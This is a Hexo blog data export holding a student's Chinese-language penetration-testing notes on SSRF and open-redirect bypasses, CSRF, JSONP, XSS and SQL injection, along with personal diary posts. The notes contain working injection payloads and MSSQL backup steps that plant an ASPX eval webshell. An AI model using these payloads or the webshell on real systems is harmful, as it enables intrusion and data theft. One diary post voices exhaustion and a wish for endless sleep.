{"meta":{"title":"xiaoG","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"About","date":"2020-12-05T17:58:06.608Z","updated":"2020-12-05T17:58:06.608Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"Tags","date":"2020-12-06T07:06:21.501Z","updated":"2020-12-06T07:06:21.501Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"Categories","date":"2020-12-05T17:58:06.608Z","updated":"2020-12-05T17:58:06.608Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"ssrf与URL重定向Bypass","slug":"ssrf与URL重定向Bypass","date":"2021-01-18T07:28:02.000Z","updated":"2021-01-18T08:28:00.537Z","comments":true,"path":"wiki/ssrf与URL重定向Bypass/","link":"","permalink":"http://example.com/wiki/ssrf%E4%B8%8EURL%E9%87%8D%E5%AE%9A%E5%90%91Bypass/","excerpt":"","text":"URL限制绕过 加上xip.io：提供dns解析的服务。如果加上例如127.0.0.1.xip.io会解析成127.0.0.1 畸形地址的绕过可以Fuzz 单斜线”/“绕过https://www.landgrey.me/redirect.php?url=/www.evil.com 缺少协议绕过https://www.landgrey.me/redirect.php?url=//www.evil.com 多斜线”/“前缀绕过https://www.landgrey.me/redirect.php?url=///www.evil.comhttps://www.landgrey.me/redirect.php?url=////www.evil.com 利用”@”符号绕过https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com 利用反斜线”&quot;绕过https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me 利用”#”符号绕过https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me 利用”?”号绕过https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me 利用”\\“绕过https://www.landgrey.me/redirect.php?url=https://www.evil.com\\\\www.landgrey.me 利用”.”绕过 https://www.landgrey.me/redirect.php?url=.evil (可能会跳转到www.landgrey.me.evil域名) https://www.landgrey.me/redirect.php?url=.evil.com (可能会跳转到evil.com域名) 10.重复特殊字符绕过 https://www.landgrey.me/redirect.php?url=///www.evil.com//.. https://www.landgrey.me/redirect.php?url=////www.evil.com//.. SSRF对于请求内网地址的限制利用畸形网址与xio.io结合例如改成 利用HOST利用服务器host 更改host，访问test.com优先指向127.0.0.1 利用302跳转更改IP的写法正则表达式和进制更改 利用其它的协议file，gopher，ftp.. 迎合指定的后缀http://127.0.0.1/Discuz/upload/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://baidu.com/?data=1.jpg[/img]","categories":[{"name":"渗透学习","slug":"渗透学习","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"ssrf","slug":"ssrf","date":"2021-01-17T03:37:21.000Z","updated":"2021-01-18T06:22:03.307Z","comments":true,"path":"wiki/ssrf/","link":"","permalink":"http://example.com/wiki/ssrf/","excerpt":"","text":"SSRF漏洞是服务端请求伪造。 上图为ssrf漏洞图示 利用ssrf漏洞可以探测第三方网站或者探测外网探测不到的本服务器的内网网络。 SSRF（curl）curl主要探测内网机器，网络。 类似上方，传入参数可以请求第三方网站 可以探测内网端口和机器 可以利用ceye.io验证漏洞是否存在 在利用burp验证漏洞是否可以利用 可以利用不同的协议去执行，读取本地文件 可以对他使用DDOS攻击 也可以利用python脚本探测端口 可以利用googlehacker查找url或api关键字 filename，share，wap，url，link，src，source，target，u，display，sourceURl，imageURL，domai","categories":[{"name":"渗透学习","slug":"渗透学习","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"前端漏洞补充","slug":"前端漏洞补充","date":"2021-01-13T08:38:30.000Z","updated":"2021-01-13T08:38:30.405Z","comments":true,"path":"wiki/前端漏洞补充/","link":"","permalink":"http://example.com/wiki/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E8%A1%A5%E5%85%85/","excerpt":"","text":"参考资料","categories":[],"tags":[]},{"title":"JSON相关问题","slug":"JSON相关问题","date":"2020-12-23T13:32:45.000Z","updated":"2020-12-25T13:38:13.460Z","comments":true,"path":"wiki/JSON相关问题/","link":"","permalink":"http://example.com/wiki/JSON%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/","excerpt":"","text":"JSONP跨域劫持和跨域读取资源导致信息泄露用户访问网站a,返回手机号码，格式是 1phoneNumber(&#123;&quot;phonenumber&quot;:&quot;13399978910&quot;&#125;) 当用户访问一个恶意站点b时，站点b通过JSONP访问网站a获取到用户的手机号码 同源策略（Same origin policy）同源策略是一种约定，简称sop，是浏览器最基本和核心的安全功能。 同源策略规定：不同域的客户端脚本在没有授权的情况下，不能读写对方的资源。 哪些属于同一个域必须相同域名，相同端口，相同协议，缺一不可。 AJAX（无法跨域获取数据）异步的javascript和XML。是指⼀种创建交互式、快速动态 ⽹⻚应⽤的⽹⻚开发技术，⽆需重新加载整个⽹⻚的情况下，能够更新部分⽹⻚的技术。XML是说数据传输 的格式是XML，但其实返回的数据还有可能是JSON（⽬前已经成为主流），⽂本，HTML等。 可以跨域的标签 上述标签可以跨域请求远程的资源，但是执行，AJAX返回的是JSON数据，不符合JS语法，要使用回调函数。 Callback输出点未控制造成xssJSON注入","categories":[{"name":"渗透学习","slug":"渗透学习","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JSON相关问题","slug":"JSON相关问题","permalink":"http://example.com/tags/JSON%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"}]},{"title":"CSRF漏洞","slug":"CSRF漏洞","date":"2020-12-21T08:47:15.000Z","updated":"2020-12-23T13:25:53.766Z","comments":true,"path":"wiki/CSRF漏洞/","link":"","permalink":"http://example.com/wiki/CSRF%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"CSRF漏洞跨站请求伪造：通过欺骗用户的浏览器，让用户点击，使用用户的名义去执行操作。 制造方法：在burp中抓包然后写成POC，最后使用户点击访问。 绕过绕过referer： 1.使用其它的协议（https://,ftp://,file://,dat://,等），通常使用iframe标签 12345678&lt;iframesrc=&quot;data:text/html;base64,IDxmb3JtIGFjdGlvbj0iaHR0cDovL3Rlc3QuY29tL3Bpa2FjaHUvdnVsL2NzcmYvY3NyZnBvc3QvY3NyZl9wb3N0X2VkaXQucGhwIiBtZXRob2Q9IlBPU1QiPgogICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzZXgiIHZhbHVlPSJnaXJsIiAvPgogICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwaG9uZW51bSIgdmFsdWU9IjExMTExIiAvPgogICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhZGQiIHZhbHVlPSJjaGFpbiIgLz4KICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZW1haWwiIHZhbHVlPSJ2aW5jZSYjNjQ7cGlrYWNodSYjNDY7Y29tIiAvPgogICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJzdWJtaXQiIC8+CiAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQgcmVxdWVzdCIgLz4KICAgIDwvZm9ybT4=&quot;&gt; 2.referer绕过规则不严谨： 如果匹配x.com，可以构造一个名为x.com的文件夹进行绕过 如果匹配http://x.com，可以制造一个子域名 3.寻找跳转链接： 寻找跳转链接，是页面跳转到自己的csrf请求页面中。 绕过token： 1.可以试一下删除token参数或者设置为空（空列表） 2.可以暴力破解 3.token值放在了url之中 用户的页面url中有token值，可以正在页面中放一个危险的链接，用户点击，会提取到用户的token值，再危险页面中的一张图片利用token值。 4.token值放在了cookie中 属于前端问题，用户自己对自己校对token值。 进行会话固定来控制受害者的cookie","categories":[{"name":"渗透学习","slug":"渗透学习","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"csrf漏洞","slug":"csrf漏洞","permalink":"http://example.com/tags/csrf%E6%BC%8F%E6%B4%9E/"}]},{"title":"xss漏洞","slug":"xss漏洞","date":"2020-12-11T00:36:14.000Z","updated":"2020-12-14T01:43:09.940Z","comments":true,"path":"wiki/xss漏洞/","link":"","permalink":"http://example.com/wiki/xss%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"xss漏洞xss：跨站脚本攻击。将脚本嵌入网站，用户打开就启动了脚本。 在xss模块，可进行需要的选择。 获取用户cookie，发到xss平台。 反射型xss：已经做好的一个页面，让用户访问获取cookie(一次性的) 储存型xss：一般存在于留言板中，只要用户访问看到留言就会获取cookie(一直有效) dom型xss：不经过后端，经过url传入参数去触发攻击（与反射型类似） xss盲注：不确定代码被嵌入到哪里，需要闭合，不断尝试 可能出现的地方1在又&lt;p&gt;&lt;/p&gt;或&lt;div&gt;&lt;/div&gt;中 在弹窗弹出我们输入内容的地方。 工具Xsstrike在GitHub中，代码写得很不错。最基本语句： 1python3 xsstrike.py -u &quot;http://exmple.com/exmple.php?page=d3v&amp;name=123&quot; 有多个参数得时候，在要测试的参数后面加上d3v。 详情查看使用手册。 burp suite 中的xss validator环境：要下载phantomjs，配置环境 需要一个xss.js文件，起到监听和交互作用 到burp中的商店中下载xss validator 先进入环境监听，在burp中抓包，发送到intruder中，payloads sets中设置extension-generated，然后设置插件 标识字符修改，在插件的grep phrase中","categories":[{"name":"渗透学习","slug":"渗透学习","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"}]},{"title":"2020-12-8","slug":"2020-12-8","date":"2020-12-08T14:52:21.000Z","updated":"2020-12-08T15:25:28.182Z","comments":true,"path":"wiki/2020-12-8/","link":"","permalink":"http://example.com/wiki/2020-12-8/","excerpt":"","text":"关于考研目标的学校已经有了。 总的来说考研的复习算是开始了吧，只是没有太多的时间要去复习。 后期事情变少了，要尽量多挤时间安排复习考研吧。 2021年主要以考研为主。 关于渗透学习感觉开始正式开始渗透学习还是太晚了，迫于学校的课程，迫于考研，迫于种种的事情，渗透的学习时间越来越少了，自己也应该要珍惜时间了吧。 尽量在寒假结束之前好好 把web学好，好好的在寒假这一段时间进行各种实战，积累经验，因为在学校里的时间是在太少了。 在考研期间，尽量抽时间进行学习渗透。 关于爱情猪猪好像比较依赖我，虽然我好像没有什么时间和能力能帮到她什么，但是还是都有拼上自己所有的力气的啊，虽然有时候真的没办法做得到像她心里期待的那样，但是我真的尽力了呀，真的把心思都放上去了呀，一天晚上我的毛概也只是刷了两个视频而已啊…虽然还是会对我发脾气，虽然还是会不想理我，但是谁让我那么喜欢她呢，看到她不开心，我心里更加难过，更加着急… 猪猪很黏我，虽然她不承认，但是我知道她很想一直和我在一起，很想和我干各种各样的事情，虽然有时候她生气也会说些让我很心疼的话，但是我知道她心里还是很喜欢很喜欢我的啦，虽然她还是会嫌弃我，真的嫌弃我嘛？我觉得她不会嫌弃我的，我觉得她好爱好爱我。 我想好好的努力，想娶她，想给她幸福的生活，想给她所有的美好，想给她所有的爱。 关于生活生活好累，真的好累好累，累到只想睡一个永远也不用醒过来的觉。 果然还是应了那一句话——出来混，迟早是要还的。大一大二的懒散，贪玩，在大三大四尽显而出。考研，学习，各种各样的压力铺面而来。期末考快来了，可是不会的还是不会，该开始复习，不能挂科。可是还要备考考研，可是还要学习渗透。可是真的对物理提不起一点点的兴趣啊，真的。不管啦，想办法先及格再说吧。 接下来的每一天，在外面都要复习，备考考研，回到宿舍要学习渗透。 看着室友还没有一点点的改变，他们还是能打游戏，能一直陪女朋友聊天，玩。而我回到宿舍只能苦逼的学习。心里有点百感交集。其实我也很想，很想很想打游戏，很想很想把所有的书都扔掉，好好的陪着我的猪猪。可是生活就是这样，推着你走，压着你走。除非我放弃自己，放弃未来。但是这不可能，我知道我未来要干什么，我知道有很多人期盼着我，我不能让任何一个对我有希望的人失望。 学习加油！考研加油！生活加油！ ”一个人受的委屈都往心里咽“——天高路远","categories":[{"name":"随想","slug":"随想","permalink":"http://example.com/categories/%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"感觉很累","slug":"感觉很累","permalink":"http://example.com/tags/%E6%84%9F%E8%A7%89%E5%BE%88%E7%B4%AF/"}]},{"title":"sql注入总结","slug":"sql注入总结","date":"2020-12-08T10:06:52.000Z","updated":"2020-12-08T15:05:25.436Z","comments":true,"path":"wiki/sql注入总结/","link":"","permalink":"http://example.com/wiki/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","excerpt":"","text":"各种sql注入的收集以及利用sql注入的收集在任何与数据库有参数的传递的地方均可能出现sql注入。 如：搜索框，url中的参数，登录页面（后台页面中居多），搜索框，http头… 判断方法： 在参数中加一个 ′ 号，如果报错则存在又注入漏洞 数字型：若语句为id=1 and 1=1# 正常，若id=1 and 1=2#报错，则为数字型。 字符型：若语句为id=1’ and ‘1’ =’1’# 正常，若id=1’ and ‘1’ =’2’#报错，则为字符型。 sql注入类型union型最重要的是找到闭合的规则。 可以直接利用查询语句查询数据库内容（权限允许）。 order by 查询字段数。 查询当前数据库,当前mysql用户 1union select 1,user(),database() 查询当前数据库里面的表 1union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;data_name&quot; 查询到敏感表名user，继续查询表里面的字段 1union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;user&quot; 查询字段，例如“id”、”passwd”的内容 1union select 1,id,passwd from user 布尔型盲注查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错。 只能通过注入语句，返回的页面有没有报错而判定信息。 先用 1and length(database())&gt;2 来猜数据库的长度，使用的是二分法。 再用 1and substr(database(),1,1)=&#x27;t&#x27; 来确定第一个字母，可用burp跑，26个字母,哪个字母返回正常则代表第一个字母就是它。 结合适合的长度进行猜解。 后面的所有信息都像union注入一般进行，但是要一个一个进行猜解，需要时间很长。 报错型注入注入点有sql的报错信息就可以进行报错注入 形如布尔盲注，只要猜解出闭合类型，返回正常即可进行注入 报错获取当前数据库语句： 1and updatexml(1,concat(0x7e,(select database()),0x7e),1) floor报错获取当前数据库： 1and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) 后面的信息获取语句形如union类型 时间盲注当页面有注入时，可以尝试加下面这个函数测试 1sleep(5); 如果有页面延迟5秒以上时则为时间盲注 接着猜出闭合的类型 形如布尔盲注一步一步获取信息 http头注入可注入的地方：cookie，Rerferer，User-Agent，X-Forwarded-For… 注入姿势 12345678GET / HTTP/1.1Host: www.example.comConnection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0&#x27;(select*from(select(sleep(20)))a) #Accept-Encoding: gzip, deflate, sdchAccept-Language: en-US,en;q=0.8,fr;q=0.6 sql注入—db_owner权限首先进行权限的判断 123and 1=(select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)) //判断是否是系统管理员and 1=(Select IS_MEMBER(&#x27;db_owner&#x27;)) //判断是否是库权限and 1=(Select IS_MEMBER(&#x27;public&#x27;)) getshell的前提首先得有db_owner权限 想办法获取网站的绝对路径 进行备份getshell Log备份Getshell姿势 1234567;alter database test set RECOVERY FULL--;create table cmd (a image)--;backup log test to disk = &#x27;c:/1.bak&#x27; with init--;insert into cmd (a) values (&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;%eval(Request.Item[&quot;hackdog&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--;backup log test to disk = &#x27;C:/Users/Administrator/Desktop/wwwroot/xf.aspx&#x27;--;drop table cmd-- 差异备份Getshell姿势 12345678910111213141⾸先完整备份⼀次(c:\\ddd.bak为所备份未见)backup database 库名 to disk = &#x27;c:\\ddd.bak&#x27;;--2.创建表并插曲⼊数据create table [dbo].[dtest] ([cmd] [image]);insert into dtest(cmd)values(0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c28526571756573742e4974656d5b226861636b646f67225d2c22756e7361666522293b253e);--3.进⾏差异备份backup database 库名 to disk=&#x27;⽬标位置\\d.asp&#x27; WITH DIFFERENTIAL,FORMAT;--上⾯0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c28526571756573742e4974656d5b226861636b646f67225d2c22756e7361666522293b253e就是⼀句话⽊马的内容：&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;hackdog&quot;],&quot;unsafe&quot;);%&gt;","categories":[{"name":"渗透学习","slug":"渗透学习","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"再用博客","slug":"初用博客","date":"2020-12-06T07:12:46.000Z","updated":"2020-12-06T07:33:39.646Z","comments":true,"path":"wiki/初用博客/","link":"","permalink":"http://example.com/wiki/%E5%88%9D%E7%94%A8%E5%8D%9A%E5%AE%A2/","excerpt":"在此警醒自己​ 今天刚花了九牛二虎之力，昨天折腾了一晚上重新搭了一个hexo博客。因为以前的懒得用而荒废了。","text":"在此警醒自己​ 今天刚花了九牛二虎之力，昨天折腾了一晚上重新搭了一个hexo博客。因为以前的懒得用而荒废了。 ​ 在这里写下第一篇文章，提醒和警醒自己，不可再像以前一样懒惰，在这里记录下自己的学习和心路历程。","categories":[{"name":"随想","slug":"随想","permalink":"http://example.com/categories/%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"随想","slug":"随想","permalink":"http://example.com/tags/%E9%9A%8F%E6%83%B3/"}]}],"categories":[{"name":"渗透学习","slug":"渗透学习","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"},{"name":"随想","slug":"随想","permalink":"http://example.com/categories/%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"JSON相关问题","slug":"JSON相关问题","permalink":"http://example.com/tags/JSON%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"},{"name":"csrf漏洞","slug":"csrf漏洞","permalink":"http://example.com/tags/csrf%E6%BC%8F%E6%B4%9E/"},{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"},{"name":"感觉很累","slug":"感觉很累","permalink":"http://example.com/tags/%E6%84%9F%E8%A7%89%E5%BE%88%E7%B4%AF/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"随想","slug":"随想","permalink":"http://example.com/tags/%E9%9A%8F%E6%83%B3/"}]}